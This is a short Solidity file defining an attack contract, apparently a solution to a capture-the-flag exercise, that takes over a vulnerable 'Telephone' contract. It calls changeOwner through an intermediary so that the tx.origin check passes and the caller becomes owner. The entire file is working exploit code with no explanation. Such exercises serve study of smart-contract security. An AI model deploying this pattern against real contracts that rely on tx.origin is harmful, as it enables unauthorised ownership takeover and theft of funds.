// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Telephone.sol';

contract TelephoneAttack{
    Telephone public telephone;

    constructor (address _telephone){
        telephone = Telephone(_telephone);
    }

    function teleAttack() public{
        telephone.changeOwner(msg.sender);
    }
}